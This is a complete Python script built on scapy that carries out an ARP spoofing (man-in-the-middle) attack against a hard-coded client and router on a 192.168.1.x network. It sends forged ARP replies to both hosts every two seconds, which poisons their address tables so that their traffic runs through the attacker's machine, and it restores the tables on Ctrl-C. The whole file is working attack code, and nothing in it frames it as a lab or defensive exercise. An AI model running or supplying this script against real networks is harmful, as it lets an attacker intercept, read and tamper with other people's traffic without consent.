import scapy.all as scapy
import time
import sys

def getmac(ip):
    arprequest = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arprequestbroadcast = broadcast/arprequest
    answeredlist = scapy.srp(arprequestbroadcast,timeout=1,verbose=False)[0]
    return answeredlist[0][1].hwsrc
	
def spoof(targetip,spoofip):
    targetmac= getmac(targetip)
    packet = scapy.ARP(op=2,pdst=targetip,hwdst=targetmac,psrc=spoofip)
    scapy.send(packet,verbose=False)

def restore(destinationip,sourceip):
    destinationmac= getmac(destinationip)
    sourcemac= getmac(sourceip)
    packet = scapy.ARP(op=2,pdst=destinationip,hwdst=destinationmac,psrc=sourceip,hwsrc=sourcemac)
    scapy.send(packet,count=4,verbose=False)

clientip = "192.168.1.6"
routerip = "192.168.1.1"
	
try:
	packetssentcount=0
	while True:
		spoof(clientip,routerip)
		spoof(routerip,clientip)	
		packetssentcount = packetssentcount+ 2
		print("\r ~~Sent "+str(packetssentcount))
		sys.stdout.flush()
		time.sleep(2)
except KeyboardInterrupt :
	print ("\n qutting")
	restore(clientip,routerip)
	restore(routerip,clientip)

